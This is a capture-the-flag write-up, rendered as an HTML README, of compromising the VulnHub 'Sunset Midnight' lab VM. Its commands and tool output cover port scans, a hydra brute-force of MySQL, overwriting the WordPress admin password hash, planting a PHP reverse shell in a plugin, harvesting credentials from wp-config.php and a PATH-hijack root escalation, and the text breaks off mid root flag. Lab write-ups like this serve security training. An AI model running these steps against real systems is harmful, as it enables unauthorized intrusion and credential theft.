@@ -1,0 +1,516 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 10.0.2.36<br/>
+<br/>
+nmap<br/>
+bruteforce mysql with hydra<br/>
+credential hunting from config file<br/>
+Privilege Escalation with SUID Environment Variables (/usr/bin/status) (PATH exploit)<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/SunsetMidnight]<br/>
+└─# nmap -sC -sV 10.0.2.36 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 17:14 +0630<br/>
+Nmap scan report for sunset-midnight (10.0.2.36)<br/>
+Host is up (0.000089s latency).<br/>
+Not shown: 65532 closed tcp ports (reset)<br/>
+PORT &nbsp; &nbsp; STATE SERVICE VERSION<br/>
+22/tcp &nbsp; open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 9cfe0b8b8d15e7727e3c23e58655512d (RSA)<br/>
+| &nbsp; 256 feebef5d40e706679b6367f8d97ed3e2 (ECDSA)<br/>
+|_ &nbsp;256 3583682c338bb46c2421200d52edcd16 (ED25519)<br/>
+80/tcp &nbsp; open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.38 ((Debian))<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+|_http-generator: WordPress 5.4.2<br/>
+|_http-title: Midnight Blog &amp;#8211; Just another WordPress site<br/>
+| http-robots.txt: 1 disallowed entry <br/>
+|_/wp-admin/<br/>
+|_http-trane-info: Problem with XML parsing of /evox/about<br/>
+3306/tcp open &nbsp;mysql &nbsp; MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1<br/>
+| mysql-info: <br/>
+| &nbsp; Protocol: 10<br/>
+| &nbsp; Version: 5.5.5-10.3.22-MariaDB-0+deb10u1<br/>
+| &nbsp; Thread ID: 14<br/>
+| &nbsp; Capabilities flags: 63486<br/>
+| &nbsp; Some Capabilities: Speaks41ProtocolNew, Support41Auth, DontAllowDatabaseTableColumn, IgnoreSigpipes, FoundRows, LongColumnFlag, ODBCClient, SupportsTransactions, SupportsCompression, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Speaks41ProtocolOld, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments<br/>
+| &nbsp; Status: Autocommit<br/>
+| &nbsp; Salt: &lt;*[n9nA6.!Y~/jJt,x;[<br/>
+|_ &nbsp;Auth Plugin Name: mysql_native_password<br/>
+MAC Address: 08:00:27:99:0D:CB (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 11.14 seconds<br/>
+<br/>
+I found juicy info from nmap:<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap port 3306 enumeration<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.0.2.36<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 17:54 +0630<br/>
+Nmap scan report for sunset-midnight (10.0.2.36)<br/>
+Host is up (0.00022s latency).<br/>
+<br/>
+PORT &nbsp; &nbsp; STATE SERVICE VERSION<br/>
+3306/tcp open &nbsp;mysql &nbsp; MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1<br/>
+| mysql-enum: <br/>
+| &nbsp; Valid usernames: <br/>
+| &nbsp; &nbsp; root:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; netadmin:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; guest:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; user:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; web:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; sysadmin:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; administrator:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; webadmin:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; admin:&lt;empty&gt; - Valid credentials<br/>
+| &nbsp; &nbsp; test:&lt;empty&gt; - Valid credentials<br/>
+|_ &nbsp;Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0<br/>
+| mysql-info: <br/>
+| &nbsp; Protocol: 10<br/>
+| &nbsp; Version: 5.5.5-10.3.22-MariaDB-0+deb10u1<br/>
+| &nbsp; Thread ID: 179082<br/>
+| &nbsp; Capabilities flags: 63486<br/>
+| &nbsp; Some Capabilities: Support41Auth, Speaks41ProtocolOld, ODBCClient, ConnectWithDatabase, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, SupportsTransactions, SupportsLoadDataLocal, InteractiveClient, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsCompression, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins<br/>
+| &nbsp; Status: Autocommit<br/>
+| &nbsp; Salt: ou~9=fmph;+d;6&lt;l.&gt;,^<br/>
+|_ &nbsp;Auth Plugin Name: mysql_native_password<br/>
+MAC Address: 08:00:27:99:0D:CB (Oracle VirtualBox virtual NIC)<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+wpscan aggressive plugin detection<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# wpscan --url http://sunset-midnight/ --plugins-detection aggressive<br/>
+_______________________________________________________________<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;__ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_______ &nbsp; _____<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ \ &nbsp; &nbsp; &nbsp; &nbsp;/ / &nbsp;__ \ / ____|<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \ \ &nbsp;/\ &nbsp;/ /| |__) | (___ &nbsp; ___ &nbsp;__ _ _ __ ®<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ \/ &nbsp;\/ / | &nbsp;___/ \___ \ / __|/ _` | '_ \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \ &nbsp;/\ &nbsp;/ &nbsp;| | &nbsp; &nbsp; ____) | (__| (_| | | | |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\/ &nbsp;\/ &nbsp; |_| &nbsp; &nbsp;|_____/ \___|\__,_|_| |_|<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;WordPress Security Scanner by the WPScan Team<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Version 3.8.22<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;Sponsored by Automattic - https://automattic.com/<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br/>
+_______________________________________________________________<br/>
+<br/>
+[+] URL: http://sunset-midnight/ [10.0.2.36]<br/>
+[+] Started: Tue Feb 21 17:15:47 2023<br/>
+<br/>
+Interesting Finding(s):<br/>
+<br/>
+[+] Headers<br/>
+&nbsp;| Interesting Entry: Server: Apache/2.4.38 (Debian)<br/>
+&nbsp;| Found By: Headers (Passive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] robots.txt found: http://sunset-midnight/robots.txt<br/>
+&nbsp;| Interesting Entries:<br/>
+&nbsp;| &nbsp;- /wp-admin/<br/>
+&nbsp;| &nbsp;- /wp-admin/admin-ajax.php<br/>
+&nbsp;| Found By: Robots Txt (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] XML-RPC seems to be enabled: http://sunset-midnight/xmlrpc.php<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+&nbsp;| References:<br/>
+&nbsp;| &nbsp;- http://codex.wordpress.org/XML-RPC_Pingback_API<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br/>
+<br/>
+[+] WordPress readme found: http://sunset-midnight/readme.html<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] Upload directory has listing enabled: http://sunset-midnight/wp-content/uploads/<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] The external WP-Cron seems to be enabled: http://sunset-midnight/wp-cron.php<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 60%<br/>
+&nbsp;| References:<br/>
+&nbsp;| &nbsp;- https://www.iplocation.net/defend-wordpress-from-ddos<br/>
+&nbsp;| &nbsp;- https://github.com/wpscanteam/wpscan/issues/1299<br/>
+<br/>
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).<br/>
+&nbsp;| Found By: Rss Generator (Passive Detection)<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;<br/>
+<br/>
+[+] WordPress theme in use: twentyseventeen<br/>
+&nbsp;| Location: http://sunset-midnight/wp-content/themes/twentyseventeen/<br/>
+&nbsp;| Last Updated: 2022-11-02T00:00:00.000Z<br/>
+&nbsp;| Readme: http://sunset-midnight/wp-content/themes/twentyseventeen/readme.txt<br/>
+&nbsp;| [!] The version is out of date, the latest version is 3.1<br/>
+&nbsp;| Style URL: http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507<br/>
+&nbsp;| Style Name: Twenty Seventeen<br/>
+&nbsp;| Style URI: https://wordpress.org/themes/twentyseventeen/<br/>
+&nbsp;| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br/>
+&nbsp;| Author: the WordPress team<br/>
+&nbsp;| Author URI: https://wordpress.org/<br/>
+&nbsp;|<br/>
+&nbsp;| Found By: Css Style In Homepage (Passive Detection)<br/>
+&nbsp;| Confirmed By: Css Style In 404 Page (Passive Detection)<br/>
+&nbsp;|<br/>
+&nbsp;| Version: 2.3 (80% confidence)<br/>
+&nbsp;| Found By: Style (Passive Detection)<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'<br/>
+<br/>
+[+] Enumerating All Plugins (via Aggressive Methods)<br/>
+&nbsp;Checking Known Locations - Time: 00:09:59 &lt;=========================================================&gt; (102310 / 102310) 100.00% Time: 00:09:59<br/>
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br/>
+<br/>
+[i] Plugin(s) Identified:<br/>
+<br/>
+[+] akismet<br/>
+&nbsp;| Location: http://sunset-midnight/wp-content/plugins/akismet/<br/>
+&nbsp;| Latest Version: 5.0.2<br/>
+&nbsp;| Last Updated: 2022-12-01T17:18:00.000Z<br/>
+&nbsp;|<br/>
+&nbsp;| Found By: Known Locations (Aggressive Detection)<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/wp-content/plugins/akismet/, status: 403<br/>
+&nbsp;|<br/>
+&nbsp;| The version could not be determined.<br/>
+<br/>
+[+] feed<br/>
+&nbsp;| Location: http://sunset-midnight/wp-content/plugins/feed/<br/>
+&nbsp;|<br/>
+&nbsp;| Found By: Known Locations (Aggressive Detection)<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/wp-content/plugins/feed/, status: 200<br/>
+&nbsp;|<br/>
+&nbsp;| The version could not be determined.<br/>
+<br/>
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)<br/>
+&nbsp;Checking Config Backups - Time: 00:00:00 &lt;================================================================&gt; (137 / 137) 100.00% Time: 00:00:00<br/>
+<br/>
+[i] No Config Backups Found.<br/>
+<br/>
+[!] No WPScan API Token given, as a result vulnerability data has not been output.<br/>
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br/>
+<br/>
+[+] Finished: Tue Feb 21 17:26:01 2023<br/>
+[+] Requests Done: 102490<br/>
+[+] Cached Requests: 15<br/>
+[+] Data Sent: 27.705 MB<br/>
+[+] Data Received: 29.235 MB<br/>
+[+] Memory used: 474.855 MB<br/>
+[+] Elapsed time: 00:10:13<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+noraml wpscan result<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# wpscan -e u,ap --url http://sunset-midnight/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+_______________________________________________________________<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;__ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_______ &nbsp; _____<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ \ &nbsp; &nbsp; &nbsp; &nbsp;/ / &nbsp;__ \ / ____|<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \ \ &nbsp;/\ &nbsp;/ /| |__) | (___ &nbsp; ___ &nbsp;__ _ _ __ ®<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ \/ &nbsp;\/ / | &nbsp;___/ \___ \ / __|/ _` | '_ \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \ &nbsp;/\ &nbsp;/ &nbsp;| | &nbsp; &nbsp; ____) | (__| (_| | | | |<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\/ &nbsp;\/ &nbsp; |_| &nbsp; &nbsp;|_____/ \___|\__,_|_| |_|<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;WordPress Security Scanner by the WPScan Team<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Version 3.8.22<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;Sponsored by Automattic - https://automattic.com/<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br/>
+_______________________________________________________________<br/>
+<br/>
+[+] URL: http://sunset-midnight/ [10.0.2.36]<br/>
+[+] Started: Tue Feb 21 17:28:51 2023<br/>
+<br/>
+Interesting Finding(s):<br/>
+<br/>
+[+] Headers<br/>
+&nbsp;| Interesting Entry: Server: Apache/2.4.38 (Debian)<br/>
+&nbsp;| Found By: Headers (Passive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] robots.txt found: http://sunset-midnight/robots.txt<br/>
+&nbsp;| Interesting Entries:<br/>
+&nbsp;| &nbsp;- /wp-admin/<br/>
+&nbsp;| &nbsp;- /wp-admin/admin-ajax.php<br/>
+&nbsp;| Found By: Robots Txt (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] XML-RPC seems to be enabled: http://sunset-midnight/xmlrpc.php<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+&nbsp;| References:<br/>
+&nbsp;| &nbsp;- http://codex.wordpress.org/XML-RPC_Pingback_API<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br/>
+&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br/>
+<br/>
+[+] WordPress readme found: http://sunset-midnight/readme.html<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] Upload directory has listing enabled: http://sunset-midnight/wp-content/uploads/<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 100%<br/>
+<br/>
+[+] The external WP-Cron seems to be enabled: http://sunset-midnight/wp-cron.php<br/>
+&nbsp;| Found By: Direct Access (Aggressive Detection)<br/>
+&nbsp;| Confidence: 60%<br/>
+&nbsp;| References:<br/>
+&nbsp;| &nbsp;- https://www.iplocation.net/defend-wordpress-from-ddos<br/>
+&nbsp;| &nbsp;- https://github.com/wpscanteam/wpscan/issues/1299<br/>
+<br/>
+[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).<br/>
+&nbsp;| Found By: Rss Generator (Passive Detection)<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.2&lt;/generator&gt;<br/>
+<br/>
+[+] WordPress theme in use: twentyseventeen<br/>
+&nbsp;| Location: http://sunset-midnight/wp-content/themes/twentyseventeen/<br/>
+&nbsp;| Last Updated: 2022-11-02T00:00:00.000Z<br/>
+&nbsp;| Readme: http://sunset-midnight/wp-content/themes/twentyseventeen/readme.txt<br/>
+&nbsp;| [!] The version is out of date, the latest version is 3.1<br/>
+&nbsp;| Style URL: http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507<br/>
+&nbsp;| Style Name: Twenty Seventeen<br/>
+&nbsp;| Style URI: https://wordpress.org/themes/twentyseventeen/<br/>
+&nbsp;| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br/>
+&nbsp;| Author: the WordPress team<br/>
+&nbsp;| Author URI: https://wordpress.org/<br/>
+&nbsp;|<br/>
+&nbsp;| Found By: Css Style In Homepage (Passive Detection)<br/>
+&nbsp;| Confirmed By: Css Style In 404 Page (Passive Detection)<br/>
+&nbsp;|<br/>
+&nbsp;| Version: 2.3 (80% confidence)<br/>
+&nbsp;| Found By: Style (Passive Detection)<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'<br/>
+<br/>
+[+] Enumerating All Plugins (via Passive Methods)<br/>
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br/>
+<br/>
+[i] Plugin(s) Identified:<br/>
+<br/>
+[+] simply-poll-master<br/>
+&nbsp;| Location: http://sunset-midnight/wp-content/plugins/simply-poll-master/<br/>
+&nbsp;|<br/>
+&nbsp;| Found By: Urls In Homepage (Passive Detection)<br/>
+&nbsp;| Confirmed By: Urls In 404 Page (Passive Detection)<br/>
+&nbsp;|<br/>
+&nbsp;| Version: 1.5 (100% confidence)<br/>
+&nbsp;| Found By: Readme - Stable Tag (Aggressive Detection)<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt<br/>
+&nbsp;| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)<br/>
+&nbsp;| &nbsp;- http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt<br/>
+<br/>
+[+] Enumerating Users (via Passive and Aggressive Methods)<br/>
+&nbsp;Brute Forcing Author IDs - Time: 00:00:00 &lt;=================================================================&gt; (10 / 10) 100.00% Time: 00:00:00<br/>
+<br/>
+[i] User(s) Identified:<br/>
+<br/>
+[+] admin<br/>
+&nbsp;| Found By: Author Posts - Author Pattern (Passive Detection)<br/>
+&nbsp;| Confirmed By:<br/>
+&nbsp;| &nbsp;Rss Generator (Passive Detection)<br/>
+&nbsp;| &nbsp;Wp Json Api (Aggressive Detection)<br/>
+&nbsp;| &nbsp; - http://sunset-midnight/wp-json/wp/v2/users/?per_page=100&amp;page=1<br/>
+&nbsp;| &nbsp;Oembed API - Author URL (Aggressive Detection)<br/>
+&nbsp;| &nbsp; - http://sunset-midnight/wp-json/oembed/1.0/embed?url=http://sunset-midnight/&amp;format=json<br/>
+&nbsp;| &nbsp;Rss Generator (Aggressive Detection)<br/>
+&nbsp;| &nbsp;Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br/>
+&nbsp;| &nbsp;Login Error Messages (Aggressive Detection)<br/>
+<br/>
+[!] No WPScan API Token given, as a result vulnerability data has not been output.<br/>
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br/>
+<br/>
+[+] Finished: Tue Feb 21 17:28:55 2023<br/>
+[+] Requests Done: 53<br/>
+[+] Cached Requests: 9<br/>
+[+] Data Sent: 14.548 KB<br/>
+[+] Data Received: 657.898 KB<br/>
+[+] Memory used: 242.871 MB<br/>
+[+] Elapsed time: 00:00:03<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+None of above infomation help me into system. So, I tried enumerating mysql.<br/>
+<br/>
+Bruteforce mysql with hydra<br/>
+<br/>
+hydra -l root -P /usr/share/wordlists/rockyou.txt 10.0.2.37 mysql<br/>
+<br/>
+[3306][mysql] host: 10.0.2.37 &nbsp; login: root &nbsp; password: robert<br/>
+<br/>
+<br/>
+Got user "root" password:<br/>
+<br/>
+password - robert<br/>
+<br/>
+So, I login into mysql and update admin password with new one:<br/>
+<br/>
+MariaDB [wordpress_db]&gt; select * from wp_users;<br/>
++----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+<br/>
+| ID | user_login | user_pass &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| user_nicename | user_email &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;| user_url &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | user_registered &nbsp; &nbsp; | user_activation_key | user_status | display_name |<br/>
++----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+<br/>
+| &nbsp;1 | admin &nbsp; &nbsp; &nbsp;| $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin &nbsp; &nbsp; &nbsp; &nbsp; | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0 | admin &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
++----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+<br/>
+1 row in set (0.001 sec)<br/>
+<br/>
+MariaDB [wordpress_db]&gt; update wp_users set user_pass = '21232f297a57a5a743894a0e4a801fc3' where user_login='admin';<br/>
+Query OK, 1 row affected (0.042 sec)<br/>
+Rows matched: 1 &nbsp;Changed: 1 &nbsp;Warnings: 0<br/>
+<br/>
+updated password - admin<br/>
+<br/>
+Now, I login wp-admin with:<br/>
+<br/>
+username - admin<br/>
+password - admin<br/>
+<br/>
+Boom! now, I'm in.<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Reverse shell<br/>
+<br/>
+I'm edit hello dolly plugin with pentest monkey php reverse shell php code.<br/>
+<br/>
+After updating plugin, Activate the plugin.<br/>
+<br/>
+Boom! I got reverse shell.<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 4444 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+listening on [any] 4444 ...<br/>
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.37] 55614<br/>
+Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux<br/>
+&nbsp;07:22:07 up 16 min, &nbsp;0 users, &nbsp;load average: 0.00, 0.00, 0.00<br/>
+USER &nbsp; &nbsp; TTY &nbsp; &nbsp; &nbsp;FROM &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; LOGIN@ &nbsp; IDLE &nbsp; JCPU &nbsp; PCPU WHAT<br/>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>
+/bin/sh: 0: can't access tty; job control turned off<br/>
+$ whoami<br/>
+www-data<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Got jose's password from /var/www/html/wordpress/wp-config.php<br/>
+<br/>
+After running linpeas, I got jose credential:<br/>
+<br/>
+╔══════════╣ Analyzing Wordpress Files (limit 70)<br/>
+-rw-r----- 1 www-data www-data 3197 Jul 18 &nbsp;2020 /var/www/html/wordpress/wp-config.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+define( 'DB_NAME', 'wordpress_db' );<br/>
+define( 'DB_USER', 'jose' );<br/>
+define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' );<br/>
+define( 'DB_HOST', 'localhost' );<br/>
+<br/>
+Now, switch to jose with his password<br/>
+<br/>
+username - jose<br/>
+password - 645dc5a8871d2a4269d4cbe23f6ae103<br/>
+<br/>
+Or<br/>
+<br/>
+connect with ssh:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh jose@10.0.2.37 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+The authenticity of host '10.0.2.37 (10.0.2.37)' can't be established.<br/>
+ED25519 key fingerprint is SHA256:N34us4v1mkW033FYIZ39T+rJmHj/ma/cmHbf/S6AovA.<br/>
+This key is not known by any other names<br/>
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>
+Warning: Permanently added '10.0.2.37' (ED25519) to the list of known hosts.<br/>
+jose@10.0.2.37's password: <br/>
+Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64<br/>
+<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+Last login: Sat Jul 18 15:33:29 2020 from 192.168.100.139<br/>
+jose@midnight:~$<br/>
+<br/>
+<br/>
+Vulnhub 1st flag<br/>
+<br/>
+jose@midnight:~$ cat user.txt <br/>
+956a9564aa5632edca7b745c696f6575<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escalation (SUID Environment Variables (/usr/bin/status))<br/>
+<br/>
+-rwsr-sr-x 1 root root 17K Jul 18 &nbsp;2020 /usr/bin/status (Unknown SUID binary!)<br/>
+<br/>
+<br/>
+<br/>
+We found that service is running as root so we can exploit that with our milicious "service". So, we need to create milicious "service" in /tmp file.<br/>
+<br/>
+cd /tmp<br/>
+<br/>
+echo '/bin/bash' &gt; service <br/>
+<br/>
+chmod +x service<br/>
+<br/>
+export PATH=/tmp:$PATH (this command means that normally cat is from /usr/bin/service that's why we need to change that PATH into our /tmp file so that status (cat) will run our milicious "service" that's why we need to change PATH)<br/>
+<br/>
+/usr/bin/status<br/>
+<br/>
+jose@midnight:~$ cd /tmp<br/>
+jose@midnight:/tmp$ echo '/bin/bash' &gt; service<br/>
+jose@midnight:/tmp$ chmod +x service <br/>
+jose@midnight:/tmp$ export PATH=/tmp:$PATH<br/>
+jose@midnight:/tmp$ /usr/bin/status<br/>
+root@midnight:/tmp# whoami<br/>
+root<br/>
+<br/>
+Vulnhub final flag<br/>
+<br/>
+root@midnight:/root# cat root.txt<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; ____<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; /' --;^/ ,-_\ &nbsp; &nbsp; \ | /<br/>
